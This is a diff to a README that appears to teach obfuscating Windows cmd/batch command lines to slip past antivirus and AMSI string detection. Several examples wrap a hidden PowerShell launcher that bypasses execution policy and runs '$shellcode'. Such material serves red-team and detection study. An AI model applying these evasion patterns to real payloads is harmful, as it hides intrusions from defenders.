@@ -14,8 +14,6 @@ suites like microsoft's AMSI/DEP/ASLR string based detection mechanisms ..
 **Example of one obfuscated bat agent** [ Agent.bat ]<br />
 ![Batch obfuscation](https://user-images.githubusercontent.com/23490060/94740418-881dc080-036a-11eb-9b99-b72b3a4959de.png)<br />
 
-**Example of one obfuscated vbs agent** [ Agent.vbs ]<br />
-![vbscript obfuscation](http://i.cubeupload.com/7oPCYh.png)<br />
 
 ---
 
@@ -41,48 +39,59 @@ suites like microsoft's AMSI/DEP/ASLR string based detection mechanisms ..
 
 ## Batch Obfuscation (cmd-bat)
 
+<br />
+
 String to obfuscate<br />
-
-      cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
-
+```cmd
+cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```
 
 String obfuscated<br />
-
-      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
+```cmd
+cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
+```
 
 ---
 
-String to obfuscate<br />
+<br />
 
-      cmd.exe /c powershell.exe Get-WmiObject -Class win32_ComputerSystem
+String to obfuscate<br />
+```cmd
+cmd.exe /c powershell.exe Get-WmiObject -Class win32_ComputerSystem
+```
 
 String obfuscated<br />
-
-      c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem
+```cmd
+c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem
+```
 
 ![rr](https://user-images.githubusercontent.com/23490060/94753079-0b4c1000-0385-11eb-80b5-9712ae6d8a17.png)
 `HINT: In tests conducted i was not been able to use 2 letters inside double quotes (eg. c"md".exe)`
 
 ---
 
+<br />
+
 Any formula under the **batch interpreter** can be started with the follow special characters: **`@`** or **`=`** or **`,`** or **`;`**
 
-      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```cmd
+=cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+@cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
+cmd.exe /c @powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      cmd.exe /c @powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
-
-      cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```
 
 String obfuscated<br />
-
-      @c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem
+```cmd
+@c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem
+```
 
 ![last](https://user-images.githubusercontent.com/23490060/94753411-0dfb3500-0386-11eb-9014-2103d88b677e.png)
 ---
@@ -95,172 +104,178 @@ HINT: Empty space technic can't be used to brake the command argument, but used 
 <br />
 
 String to obfuscate<br />
-
-      cmd.exe /c start /max netstat -ano | findstr LISTENING
-
-String obfuscated [whitespaces]<br />
-
-![batch obfuscation](http://i.cubeupload.com/eyGNUO.jpg)
+```cmd
+cmd.exe /c start /max netstat -ano | findstr LISTENING
+```
 
 String obfuscated [whitespaces+collon+semi-collon]<br />
-
-      cmd.exe /c ,;,  start ;,,  /max ;,,  netstat -ano |; findstr  ,;LISTENING
+```cmd
+cmd.exe /c ,;,  start ;,,  /max ;,,  netstat -ano |; findstr  ,;LISTENING
+```
 
 String obfuscated [whitespaces+collon+semi-collon+caret]<br />
-
-      c^md.e^xe /^c ,;,  st^ar^t ,/mA^x ;^,,  n^et^sta^t -a^no |; fi^nds^tr  ,;LI^ST^ENING
+```cmd
+c^md.e^xe /^c ,;,  st^ar^t ,/mA^x ;^,,  n^et^sta^t -a^no |; fi^nds^tr  ,;LI^ST^ENING
+```
 
 String obfuscated [whitespaces+collon+semi-collon+caret+quotes]<br />
-
-      ;c^M"d".e^Xe ,/^c ,;,  ,sT^aR^t ,/mA^x "";^,,  n^Et^s"T"a^t  -a^"n"O |;, ,fI^n"d"S^tr  ,;L"I"^ST^EN"I"NG
-
-![batch obfuscation](http://i.cubeupload.com/zneLJv.jpg)
+```cmd
+;c^M"d".e^Xe ,/^c ,;,  ,sT^aR^t ,/mA^x "";^,,  n^Et^s"T"a^t  -a^"n"O |;, ,fI^n"d"S^tr  ,;L"I"^ST^EN"I"NG
+```
 
 ---
 
-Using the alternative cmd.exe [ /R ] switch to execute commands
+<br />
 
-![batch obfuscation](http://i.cubeupload.com/dQkpXr.jpg)<br />
+Using the alternative cmd.exe [ /R ] switch to execute commands<br /><br />
+
+String to obfuscate<br />
+```cmd
+cmd.exe /c start calc.exe
+```
+
+String obfuscated<br />
+```cmd
+cmd.exe /R start calc.exe
+```
+
+---
+
+<br />
+
+since we are using the cmd interpreter to lunch powershell,<br />
+we can replace the powershell trigger args '`-`' by cmd interpreter: '`/`'
 
 <br />
 
 String to obfuscate<br />
-
-      cmd.exe /c start calc.exe
+```cmd
+cmd.exe /c powershell.exe -wind hidden Get-WmiObject -Class Win32_ComputerSystem
+```
 
 String obfuscated<br />
-
-      cmd.exe /R start calc.exe
-
-![batch obfuscation](http://i.cubeupload.com/9cwoS1.jpg)
+```cmd
+cmd.exe /c powershell.exe /wInd 3 Get-WmiObject -Class Win32_ComputerSystem
+```
 
 ---
-
-- cmd arguments trigger chars [ - or / ]
-
-      since we are using the cmd interpreter to lunch powershell, we can replace
-      the powershell trigger arguments characters '-' by cmd interpreter: '/'
 
 <br />
 
-- String to obfuscate<br />
-`cmd.exe /c powershell.exe -wind hidden Get-WmiObject -Class Win32_ComputerSystem`
-
-- String obfuscated<br />
-`cmd.exe /c powershell.exe /wInd 3 Get-WmiObject -Class Win32_ComputerSystem`<br />
-
-![batch obfuscation](http://i.cubeupload.com/MngcC1.jpg)
-
----
-
-- We can also **pipe** commands to avoid detection, adding rubish data into the beggining of the funtion
-
-      echo "rubish data" | cmd.exe /c start powershell.exe
+We can also **pipe** commands to avoid detection, adding rubish data into the beggining of the funtion
+```cmd
+echo "rubish data" | cmd.exe /c start powershell.exe
+```
 
 ![one](https://user-images.githubusercontent.com/23490060/95484664-a7c77100-0988-11eb-8450-85b815cf1c06.png)
 
-      HINT: using [ || ] allow us to execute the 2º command if the 1º one fails to execute
-      COPY %windir%\notepad.exe %nonexisting%\fake.exe || cmd.exe /c start calc
-
-![pipe commands](http://i.cubeupload.com/EIQWfa.jpg)
-
+HINT: using [ || ] allow us to execute the 2º command if the 1º one fails to execute<br />
 
 ---
 
-      [ Brake command line arguments into diferent vars ]
-      The batch command 'CALL' executes one batch file from within another. If you execute a
-      batch file from inside another batch file without using CALL, the original batch file
-      is terminated before the other one starts. CALL command can also be used to 'call'
-      the previous defined variables and joint them together in a new environment variable. 
+<br />
+
+<b><i>[ Brake command line arguments into diferent vars ]</i></b>
+The batch command 'CALL' executes one batch file from within another. If you execute a
+batch file from inside another batch file without using CALL, the original batch file
+is terminated before the other one starts. CALL command can also be used to 'call'
+the previous defined variables and joint them together in a new environment variable. 
       
-
 <br />
 
 
-- String command to obfuscate<br />
-`cmd.exe /c netstat -s -p TCP`
+String command to obfuscate<br />
+```cmd
+cmd.exe /c netstat -s -p TCP
+```
 
-- String obfuscated [brake command line arguments into diferent vars]<br />
+String obfuscated [brake command line arguments into diferent vars]<br />
+```cmd
+cmd.exe /c "set com3= /s /p TCP&&set com2=stat&&set com1=net&&call set join=%com1%%com2%%com3%&&call %join%"
+```
 
-      cmd.exe /c "set com3= /s /p TCP&&set com2=stat&&set com1=net&&call set join=%com1%%com2%%com3%&&call %join%"
+<br />
 
-![batch obfuscation](http://i.cubeupload.com/LtFMqK.jpg)
+String obfuscated [brake command line arguments into diferent vars]<br />
+```cmd
+cmd.exe /c "set com1=net&&set com2=stat&&set join=%com1%%com2%&&echo %join% | cmd"
+```
 
-      Another diferent way to brake the command into diferent variables, join them together, and exec
+<br />
 
-- String obfuscated [brake command line arguments into diferent vars]<br />
-`cmd.exe /c "set com1=net&&set com2=stat&&set join=%com1%%com2%&&echo %join% | cmd"`
+String obfuscated [brake command line arguments into diferent vars]<br />
+```cmd
+cmd.exe /c "set com1=net&&set com2=stat&&set com3=-p&&set join=%com1%%com2% -s %com3% TCP&&echo %join%|cmd"
+```
 
-![batch obfuscation](http://i.cubeupload.com/vzzmTR.jpg)
+<br />
 
-      HINT: we can separate the command arguments also, example: cmd.exe /c [var][var] -s [var] TCP
-      This way we can separate the command from its arguments or even input a new argument in the middle.
+String obfuscated [another example using cmd /c to exec the string]<br />
+```cmd
+cmd.exe /c "set buff=net&& set void=at&&set char=st&&" cmd /V:ON /c %buff%!char!%void% -s -p UDP
+```
 
-- String obfuscated [brake command line arguments into diferent vars]<br />
+<br />
 
-      cmd.exe /c "set com1=net&&set com2=stat&&set com3=-p&&set join=%com1%%com2% -s %com3% TCP&&echo %join%|cmd"
+String obfuscated [special characters inside set declarations]<br />
+```cmd
+cmd.exe /c "set --$#$--=net&& set '''=at&&set ;;;;=st&&" cmd /c %--$#$--%%;;;;%%'''% -s -p UDP
+```
 
-![batch obfuscation](http://i.cubeupload.com/A4j8mi.jpg)
-
-      we can also use the "enabling delayed environment variable expansion" [/V:ON]
-      command to be able to call your variales in two diferent ways: %var% OR !var!
-
-- String obfuscated [another example using cmd /c to exec the string]<br />
-`cmd.exe /c "set buff=net&& set void=at&&set char=st&&" cmd /V:ON /c %buff%!char!%void% -s -p UDP`
-
-![batch obfuscation](http://i.cubeupload.com/Y2KNXr.jpg)
-
-      cmd.exe variable declarations also accepts special characters
-
-- String obfuscated [special characters inside set declarations]<br />
-`cmd.exe /c "set --$#$--=net&& set '''=at&&set ;;;;=st&&" cmd /c %--$#$--%%;;;;%%'''% -s -p UDP`
-
-![batch obfuscation](http://i.cubeupload.com/v5FqKw.jpg)
+![rr1](https://user-images.githubusercontent.com/23490060/120901770-b0199e00-c634-11eb-9a6b-a767fcef0db2.png)
 
 ---
 
-      Obfuscating windows batch files using undefined environmental variables.
-      '''Inside .bat files''' undefined environmental variables are expanded into empty strings
-      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
+<br />
 
-      Choose some set of environmental variables that you are certain are not defined
-      on most of the machines Example: single or two letter variables like %A%, %0B%, %C% ..
+<b><i>Obfuscating windows batch files using undefined environmental variables.</i></b> '''Inside .bat files''' undefined environmental variables<br />
+are expanded into empty strings Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
+
+Chose some set of environmental variables that are not defined on most of the machines Example: `%A%`, `%0B%`, `%C%` ..
 
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />
+String command to obfuscate<br />
+```cmd
+cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode
+```
 
-- String obfuscated (**undefined-vars.bat**)<br />
-
-      @echo off
-      %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
-      exit
+String obfuscated (**undefined-vars.bat**)<br />
+```cmd
+@echo off
+%comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
+exit
+```
 
 ![two](https://user-images.githubusercontent.com/23490060/95485321-769b7080-0989-11eb-9861-ddeaa86481de.png)<br />
 `HINT: Undefined variables technic are only accessible in bat scripting (it will not work in terminal)`
 
 ---
 
-      We can also use batch local enviroment variables to scramble the syscall's
-      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
-      HINT: chose letters as: 'a e i o u' because they are the most commom ;)
-      HINT: dont leave 'empty spaces' defining variables (set i#=t<empty-space>)
+<br />
+
+<b><i>We can also use batch local enviroment variables to scramble the syscall's</i></b>
+Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
+HINT: chose letters as: 'a e i o u' because they are the most commom ;)
+HINT: dont leave 'empty spaces' defining variables (set i#=t<empty-space>)
 
 <br />
 
-- String command to obfuscate<br />
-`netstat -s | findstr Opens`<br />
+String command to obfuscate<br />
+```cmd
+netstat -s | findstr Opens
+```
 
-- String obfuscated (**test.bat**)<br />
+String obfuscated (**test.bat**)<br />
+```cmd
+@echo off
+set i#=t
+set pP0=p
+set db0=a
+set !h=n
 
-      @echo off
-      set i#=t
-      set pP0=p
-      set db0=a
-      set !h=n
-
-      %!h%e%i#%st%db0%%i#% -"s" | fi%!h%ds%i#%r O%pP0%e%!h%s
+%!h%e%i#%st%db0%%i#% -"s" | fi%!h%ds%i#%r O%pP0%e%!h%s
+```
 
 ![tres](https://user-images.githubusercontent.com/23490060/95486006-63d56b80-098a-11eb-94b1-a7ea0d6ca7f1.png)
 
